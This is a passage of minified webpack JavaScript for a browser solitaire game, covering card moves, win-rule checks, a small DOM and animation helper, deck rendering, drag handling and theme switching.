e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0});var i=a(2),r=n(i),d=a(3),u=n(d),o=a(51),l=n(o);t["default"]=function(){var e=l["default"].get("pref");!e&&(e=u["default"].pref),r["default"].dispatch("fieldThemesSet",e)}},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}var i=a(2),r=n(i),d=a(1),u=n(d),o=a(3),l=n(o),s=a(5),f=n(s),c=a(11),p=n(c),v=a(6),h=n(v),m=a(8),y=n(m),g=a(22),k=n(g),_=a(54),x=n(_),b=a(9),w=n(b),D=function P(e,t,a){f["default"].animationDefault(),window._debug_time=(new Date).getTime();var n=null,i=e[0].card.parent&&f["default"].getElementById(e[0].card.parent),d=!0,o=(0,w["default"])(),s=u["default"].get("stepType");if(s!=l["default"].stepType&&(o.autoSteps&&!o.autoSteps[s]||!o.autoSteps)){var c=e[0].card.parent&&f["default"].getElementById(e[0].card.parent);return void r["default"].dispatch("moveCardToHome",{moveDeck:e,departure:c})}if(!a.dbclick&&0===a.distance&&u["default"].get("moveDistance")>0&&s==l["default"].stepType)return!1;d=d&&t;var v=t&&t.id&&f["default"].getElementById(t.id);if(v&&("card"==v.type?n=f["default"].getElementById(v.parent):"deck"==v.type&&(n=v)),d=d&&n,d=d&&i,n&&n.getId()!=i.getId()){var m=n.Put(e);if(d=d&&m,m){var g=i.Pop(e.length);if(d=d&&g,g){n.Push(g),f["default"].animationDefault(),k["default"].add({move:{from:i.name,to:n.name,deck:p["default"].deckCardNames(e)}});var _=i.cards;_.length&&_[_.length-1].flip&&(_[_.length-1].flip=!1,k["default"].add({unflip:{deck:i.name,card:{name:_[_.length-1].name,index:_.length-1}}})),r["default"].dispatch("moveDragDeck",{departure:i,destination:n,moveDeck:e,callback:function(){r["default"].dispatch("moveEnd",{from:i,to:n,moveDeck:e})}}),s==l["default"].stepType&&(window._debug_time=(new Date).getTime(),r["default"].dispatch("makeStep",k["default"].get())),x["default"].winCheck({show:!0})}}}else d=!1;if(!d&&i)if(o.inputParams.doubleClick&&a.dbclick||a.distance>=u["default"].get("moveDistance")){var b=(0,y["default"])(e,a);if(b)return void P(e,b.to.deck.domElement.el,a);r["default"].dispatch("moveCardToHome",{moveDeck:e,departure:i})}else r["default"].dispatch("moveCardToHome",{moveDeck:e,departure:i});h["default"].checkTips()};r["default"].listen("Move",function(e){D(e.moveDeck,e.to,e.cursorMove)})},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0});var i=a(1),r=n(i),d=a(2),u=n(d),o=a(5),l=(n(o),a(55)),s=n(l),f=a(11),c=n(f),p=function(e){var t=!0,a=!1,n=r["default"].get("winCheck");for(var i in n.rules)if(a=!0,s["default"][i]){var d=s["default"][i]({decks:c["default"].getDecks({visible:!0}),rulesArgs:n.rules[i]});t=t&&d}else t=t&&s["default"].newerWin();return a||(t=t&&s["default"].newerWin()),!!t&&(!(!e||!e.noCallback)||(u["default"].dispatch("win",e),!0))},v=function(e){e||(e={}),void 0===e.show&&(e.show=!1),p(e)};t["default"]={winCheck:p,hwinCheck:v}},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0});var i=a(5),r=n(i),d=a(3),u=n(d),o={group:function(e){if(!e.filter||!e.filterArgs)return!1;var t=[];for(var a in e.decks)("string"==typeof e.filterArgs&&e.decks[a].parent==e.filterArgs||e.filterArgs.length&&e.filterArgs.indexOf(e.decks[a].parent)>=0)&&t.push(e.decks[a]);return e.decks=t,t.length},groups:function(e){return o.group(e)},deck:function(e){if(!e.filter||!e.filterArgs)return!1;var t=[];for(var a in e.decks)("string"==typeof e.filterArgs&&e.decks[a].name==e.filterArgs||e.filterArgs.indexOf(e.decks[a].name)>=0)&&t.push(e.decks[a]);return e.decks=t,t.length},decks:function(e){return o.deck(e)},_asc_desk:function(e){if(!e||"number"!=typeof e.asc_desk)return!1;var t=!0;for(var a in e.decks){if(!t)return!1;var n=e.decks[a].cards;for(var i in n)if(i>0){var d=r["default"].validateCardName(n[(0|i)-1].name),o=r["default"].validateCardName(n[0|i].name),l=u["default"].card.ranks;t=t&&d&&o&&l.indexOf(d.rank)==l.indexOf(o.rank)+e.asc_desk}}return t},newerWin:function(){return!1},allEmpty:function(e){var t=!0;for(var a in e.decks)t=t&&0===e.decks[a].cards.length;return t},empty:function(e){o.allEmpty(e)},allInOne:function(e){var t=0,a=0,n=0;for(var i in e.decks)0===e.decks[i].cards.length?t+=1:n=i,a+=1;var r=t==a-1;return e.filter&&(e.decks=r?[e.decks[n]]:[]),r},allAscend:function(e){return e.asc_desk=-1,o._asc_desk(e)},allDescent:function(e){return e.asc_desk=1,o._asc_desk(e)},lego:function(e){if(!e||!e.rulesArgs)return!1;var t=!0;for(var a in e.rulesArgs){var n={};for(var i in e.decks)n[i]=e.decks[i];var r={decks:n};if(t&&e.rulesArgs[a].filters){r.filter=!0;for(var d in e.rulesArgs[a].filters)if("string"==typeof e.rulesArgs[a].filters[d]&&o[e.rulesArgs[a].filters[d]])r.filterArgs=null,t=t&&o[e.rulesArgs[a].filters[d]](r);else if(e.rulesArgs[a].filters[d]&&""+e.rulesArgs[a].filters[d]=="[object Object]")for(var u in e.rulesArgs[a].filters[d])o[u]?(r.filterArgs=e.rulesArgs[a].filters[d][u],t=t&&o[u](r)):t=t&&o.newerWin();else t=t&&o.newerWin();r.filter=!1}if(e.rulesArgs[a].rules)for(var l in e.rulesArgs[a].rules)t=o[e.rulesArgs[a].rules[l]]?t&&o[e.rulesArgs[a].rules[l]](r):t&&o.newerWin()}return t}};t["default"]=o},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}var i=a(2),r=n(i),d=a(57),u=n(d),o=a(60),l=(n(o),a(61)),s=(n(l),a(62)),f=(n(s),a(63)),c=(n(f),a(64)),p=(n(c),a(65)),v=(n(p),a(66));n(v);r["default"].listen("removeEl",function(e){(0,u["default"])(e.domElement).remove()}),r["default"].listen("showCard",function(e){(0,u["default"])(e).show()}),r["default"].listen("hideCard",function(e){(0,u["default"])(e).hide()}),r["default"].listen("stopAnimations",function(){u["default"].stopAnimations()})},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}Object.defineProperty(t,"__esModule",{value:!0});var i=a(3),r=(n(i),a(1)),d=n(r),u=a(58),o=n(u),l=a(59),s=n(l);d["default"].set("animatedElements",0),d["default"].set("animatedElementsStack",[]),d["default"].set("animatedCallback",function(){});var f=function(e){if(!e)throw Error("elRender:empty arguments");if("string"!=typeof e)return e.el||e.elements?e:new o["default"](e);try{if("#"==e[0]){var t=document.getElementById(e.slice(1,1/0));return new o["default"](t)}if("."==e[0]){var a=document.getElementsByClassName(e.slice(1,1/0));return new s["default"](a)}if("<"==e[0]){var n=document.createElement("temp");n.innerHTML=e;var i=n.children[0];return new o["default"](i)}}catch(e){}};f.stopAnimations=function(e){f(".animated").css({transition:"0s"}).removeClass("animated")},t["default"]=f},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}function i(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}Object.defineProperty(t,"__esModule",{value:!0});var r=function(){function e(e,t){for(var a=0;a<t.length;a++){var n=t[a];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}return function(t,a,n){return a&&e(t.prototype,a),n&&e(t,n),t}}(),d=a(2),u=n(d),o=a(1),l=n(o),s=a(3),f=n(s),c=function(){function e(t){i(this,e),this.el=t,t||(this.el=null)}return r(e,[{key:"attr",value:function(e){try{for(var t in e)this.el[t]=e[t];return this}catch(a){}}},{key:"hasClass",value:function(e){try{var t=this.el.className.split(" ");return t.indexOf(e)>=0}catch(a){}}},{key:"toggleClass",value:function(e){try{this.hasClass(e)?this.removeClass(e):this.addClass(e)}catch(t){}}},{key:"addClass",value:function(e){try{var t=this.el.className.split(" ");return this.hasClass(e)||(t.push(e),this.el.className=t.join(" ")),this}catch(a){}}},{key:"removeClass",value:function(e){if(!this.el||!this.el.className)return this;try{var t=this.el.className.split(" ");if(this.hasClass(e)){var a=[];for(var n in t)t[n]!=e&&a.push(t[n]);t=a,this.el.className=t.join(" ")}return this}catch(i){}}},{key:"css",value:function(e){if(!this.el)return this;try{for(var t in e)try{this.el.style[t]=e[t]}catch(a){}return this}catch(a){}}},{key:"hide",value:function(){try{return this.css({display:"none"})}catch(e){}}},{key:"show",value:function(){try{return this.css({display:"block"})}catch(e){}}},{key:"append",value:function(e){try{return e.el&&(e=e.el),this.el.appendChild(e),this}catch(t){}}},{key:"html",value:function(e){try{return void 0===e?this.el.innerHTML:(e.el&&(e=e.el),this.el.innerHTML=e,this)}catch(t){}}},{key:"animate",value:function(e,t,a,n){var i=this;try{var r=l["default"].get("animation");void 0===t&&(t=f["default"].animationTime),"function"==typeof t&&(a=t,t=f["default"].animationTime),"string"==typeof a&&(n=a,a=null),setTimeout(function(){r&&i.css({transition:t/1e3+"s"});var d=0;for(var o in e)i.el.style[o]!=e[o]&&(d+=1),i.el.style[o]=e[o];r?(i.addClass("animated"),i.el.addEventListener("transitionend",function(){d-=1,d||(i.removeClass("animated"),i.css({transition:null}),"function"==typeof a&&a(),u["default"].dispatch("allAnimationsEnd",n))},!1)):("function"==typeof a&&a(),u["default"].dispatch("allAnimationsEnd",n))},0)}catch(d){}}},{key:"remove",value:function(){try{this.el.remove()}catch(e){}}},{key:"parent",value:function(){return new e(this.el.parentNode)}},{key:"after",value:function(e){try{this.el.parentNode.insertBefore(e,this.el.nextElementSibling)}catch(t){}return this}},{key:"before",value:function(e){try{this.el.parentNode.insertBefore(e,this.el)}catch(t){}return this}},{key:"event",value:function(e,t){this.el.addEventListener(e,t)}},{key:"click",value:function(e){this.event(e)}}]),e}();t["default"]=c},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}function i(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}Object.defineProperty(t,"__esModule",{value:!0});var r=function(){function e(e,t){for(var a=0;a<t.length;a++){var n=t[a];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(e,n.key,n)}}return function(t,a,n){return a&&e(t.prototype,a),n&&e(t,n),t}}(),d=a(3),u=n(d),o=a(58),l=n(o),s=function(){function e(t){i(this,e),this.elements=[];for(var a in t)this.elements.push(new l["default"](t[a]))}return r(e,[{key:"attr",value:function(e){for(var t in this.elements)this.elements[t].attr(e);return this}},{key:"toggleClass",value:function(e){for(var t in this.elements)this.elements[t].toggleClass(e);return this}},{key:"addClass",value:function(e){for(var t in this.elements)this.elements[t].addClass(e);return this}},{key:"removeClass",value:function(e){for(var t in this.elements)this.elements[t].removeClass(e);return this}},{key:"css",value:function(e){for(var t in this.elements)this.elements[t].css(e);return this}},{key:"hide",value:function(){for(var e in this.elements)this.elements[e].hide();return this}},{key:"show",value:function(){for(var e in this.elements)this.elements[e].show();return this}},{key:"animate",value:function(e,t,a,n){void 0===t&&(t=u["default"].animationTime),"function"==typeof t&&(a=t,t=u["default"].animationTime),"string"==typeof a&&(n=a,a=null);var i=0;for(var r in this.elements)i+=1,this.elements[r].animate(e,t,function(){i-=1,i||a()});return this}},{key:"remove",value:function(){for(var e in this.elements)this.elements[e].remove();return this}}]),e}();t["default"]=s},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}var i=a(1),r=n(i),d=a(2),u=n(d),o=a(3),l=n(o),s=a(9),f=n(s),c=a(57),p=n(c);u["default"].listen("initField",function(e){var t=e.a.field?e.a.field:"#map";"string"==typeof t&&(t=2==t.split(".").length?document.getElementsByClassName(t.split(".")[1])[0]:2==t.split("#").length?document.getElementById(t.split("#")[1]):document.getElementsByTagName(t),t||(t=document.getElementById("mat")));var a=(0,f["default"])();a.domElement=t;var n={};e.a.width&&"number"==typeof e.a.width&&(n.width=e.a.width+"px"),e.a.height&&"number"==typeof e.a.height&&(n.height=e.a.height+"px"),e.a.top&&"number"==typeof e.a.top&&(n.top=e.a.top+"px"),e.a.left&&"number"==typeof e.a.left&&(n.left=e.a.left+"px");var i=r["default"].get("zoom");(i!=l["default"].zoom||1!=i)&&(n.transform="scale("+i+")",n["transform-origin"]="0 0"),(0,p["default"])(t).css(n).addClass("solitaireField")})},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}var i=a(2),r=n(i),d=a(1),u=n(d),o=a(3),l=n(o),s=a(9),f=n(s),c=a(57),p=n(c),v=function(e,t,a){e.x=t.position&&t.position.x&&"number"==typeof t.position.x?t.position.x:0,e.y=t.position&&t.position.y&&"number"==typeof t.position.y?t.position.y:0,e.x=t.parentPosition&&t.parentPosition.x?e.x+t.parentPosition.x:e.x,e.y=t.parentPosition&&t.parentPosition.y?e.y+t.parentPosition.y:e.y,a.rotate=e.rotate=t.rotate&&"number"==typeof t.rotate?t.rotate:0,e.padding_y=t.paddingY&&"number"==typeof t.paddingY?t.paddingY:t.paddingType?l["default"].padding_y:0,e.padding_x=t.paddingX&&"number"==typeof t.paddingX?t.paddingX:t.paddingType?l["default"].padding_x:0,e.flip_padding_y=t.flipPaddingY&&"number"==typeof t.flipPaddingY?t.flipPaddingY:t.paddingType?l["default"].flip_padding_y:0,e.flip_padding_x=t.flipPaddingX&&"number"==typeof t.flipPaddingX?t.flipPaddingX:t.paddingType?l["default"].flip_padding_x:0};r["default"].listen("addDeckEl",function(e){var t=(0,f["default"])();v(e.params,e.a,e.deck),e.deck.domElement=(0,p["default"])("<div>");var a={left:e.params.x+"px",top:e.params.y+"px",width:l["default"].card.width+"px",height:l["default"].card.height+"px",transform:"rotate("+(0|e.params.rotate)+"deg)"};a.display=e.deck.visible?"block":"none",(0,p["default"])(e.deck.domElement).css(a).addClass("el").attr({id:e.deck.getId()}),e.a.showSlot&&(0,p["default"])(e.deck.domElement).addClass("slot"),e.a["class"]&&(0,p["default"])(e.deck.domElement).addClass(e.a["class"]),(0,p["default"])(t.domElement).append(e.deck.domElement);var n=e.a.label&&"string"==typeof e.a.label?e.a.label:null;if(n){var i=(0,p["default"])("<div>").addClass("deckLabel");(0,p["default"])(i).html(n),(0,p["default"])(e.deck.domElement).append(i)}}),r["default"].listen("redrawDeckFlip",function(e){if(e&&e.cards)for(var t in e.cards){
var a={};e.cards[t].flip?(0,p["default"])(e.cards[t].domElement).addClass("flip"):(0,p["default"])(e.cards[t].domElement).removeClass("flip"),(0,p["default"])(e.cards[t].domElement).css(a)}}),r["default"].listen("redrawDeckIndexes",function(e){if(e&&e.cards)for(var t in e.cards)(0,p["default"])(e.cards[t].domElement).css({"z-index":(0|l["default"].startZIndex)+(0|t)})}),r["default"].listen("redrawDeck",function(e){if(u["default"].get("noRedraw"))return!1;e.data&&(v(e.params,e.data,e.deck),e.data.paddingX&&u["default"].get("padding_x",e.data.paddingX),e.data.flipPaddingX&&u["default"].get("flip_padding_x",e.data.flipPaddingX),e.data.paddingY&&u["default"].get("padding_y",e.data.paddingY),e.data.flipPaddingY&&u["default"].get("flip_padding_y",e.data.flipPaddingY));var t={left:e.params.x,top:e.params.y,transform:"rotate("+(0|e.params.rotate)+"deg)"};t.display=e.deck.visible?"block":"none",(0,p["default"])(e.deck.domElement).css(t);for(var a in e.cards){var n=e.deck.padding(a),i=(0|e.params.startZIndex)+(0|a),t={left:n.x+"px",top:n.y+"px","z-index":i,"-ms-transform":"rotate("+(0|e.params.rotate)+"deg)","-webkit-transform":"rotate("+(0|e.params.rotate)+"deg)","-moz-transform":"rotate("+(0|e.params.rotate)+"deg)",transform:"rotate("+(0|e.params.rotate)+"deg)"};t.display=e.deck.visible?"block":"none",e.cards[a].flip?(0,p["default"])(e.cards[a].domElement).addClass("flip"):(0,p["default"])(e.cards[a].domElement).removeClass("flip"),(0,p["default"])(e.cards[a].domElement).css(t)}})},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}var i=a(1),r=(n(i),a(2)),d=n(r),u=a(3),o=n(u),l=a(5),s=(n(l),a(9)),f=n(s),c=a(57),p=n(c);d["default"].listen("addCardEl",function(e){var t=(0,f["default"])(),a={width:o["default"].card.width,height:o["default"].card.height};a={width:1*a.width.toFixed(3),height:1*a.height.toFixed(3)};var n={width:a.width+"px",height:a.height+"px"};e.domElement=(0,p["default"])("<div>"),(0,p["default"])(e.domElement).addClass("el card draggable "+e.name).css(n).attr({id:e.id}),(0,p["default"])(t.domElement).append(e.domElement)}),d["default"].listen("hideCard",function(e){e&&e.domElement&&(0,p["default"])(e.domElement[0]).hide()}),d["default"].listen("showCard",function(e){e&&e.domElement&&(0,p["default"])(e.domElement[0]).show()})},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}var i=a(2),r=n(i),d=a(57),u=n(d),o=a(6),l=n(o);r["default"].listen("showTip",function(e){e&&e.el&&e.el.domElement&&e.type&&(0,u["default"])(e.el.domElement).addClass(e.type)}),r["default"].listen("hideTips",function(e){if(e&&e.types)for(var t in e.types){var a=e.types[t];(0,u["default"])("."+a).removeClass(a)}else for(var t in l["default"].tipTypes){var a=l["default"].tipTypes[t];(0,u["default"])("."+a).removeClass(a)}})},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}var i=a(2),r=n(i),d=a(1),u=(n(d),a(5)),o=n(u),l=a(3),s=n(l),f=a(57),c=n(f),p=function(e){return e<0&&(e=360+e),e>360&&(e-=360),e};r["default"].listen("moveDragDeck",function(e){o["default"].curLock();for(var t in e.moveDeck){var a=e.destination.padding(e.destination.cards.length-1+(0|t)),n=p(e.departure.rotate),i=p(e.destination.rotate);(0,c["default"])(e.moveDeck[t].card.domElement).css({transform:"rotate("+n+"deg)"}),n-i>180&&(n-=360,(0,c["default"])(e.moveDeck[t].card.domElement).css({transform:"rotate("+n+"deg)"})),n-i<-180&&(i-=360);var d={left:a.x+"px",top:a.y+"px",transform:"rotate("+i+"deg)"},u=(0|s["default"].topZIndex)+(0|t);(0,c["default"])(e.moveDeck[t].card.domElement).css({"z-index":u}).animate(d,function(e){e.departure.Redraw(),e.destination.Redraw(),o["default"].curUnLock(),"function"==typeof e.callback&&e.callback(),r["default"].dispatch("moveDragDeckDone",{deck:e.destination})}.bind(this,e))}}),r["default"].listen("moveDragDeckDone",function(e){if(e.deck.fill){var t=e.deck.cards;for(var a in t)(0,c["default"])(t[a].domElement).addClass("fill")}}),r["default"].listen("dragDeck",function(e){for(var t in e._dragDeck){var a=e._deck.padding(e._dragDeck[t].index),n={left:a.x+(e.x-e._startCursor.x)+"px",top:a.y+(e.y-e._startCursor.y)+"px","z-index":s["default"].topZIndex+(0|t)};(0,c["default"])(e._dragDeck[t].card.domElement).css(n)}})},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}var i=a(2),r=n(i),d=a(5),u=n(d),o=a(1),l=n(o),s=a(57),f=n(s);r["default"].listen("moveCardToHome",function(e){l["default"].get("lastCursorMove").distance>0&&u["default"].curLock();for(var t in e.moveDeck){var a=e.departure.padding(e.moveDeck[t].index),n={left:a.x+"px",top:a.y+"px"};(0,f["default"])(e.moveDeck[t].card.domElement).animate(n,function(){u["default"].curUnLock(),e.departure&&e.departure.Redraw()},"moveCardToHomeAnimation")}})},function(e,t,a){"use strict";function n(e){return e&&e.__esModule?e:{"default":e}}var i=a(2),r=n(i),d=a(3),u=n(d),o=a(9),l=n(o),s=a(57),f=n(s);r["default"].listen("fieldThemesSet",function(e){var t=(0,l["default"])(),a=t.domElement;for(var n in u["default"].themes){for(var i in u["default"].themes[n]){var r=u["default"].themes[n][i];(0,f["default"])(a).removeClass(r)}var d=e[n];(0,f["default"])(a).addClass(d)}})},function(e,t){},function(e,t){},function(e,t){}]);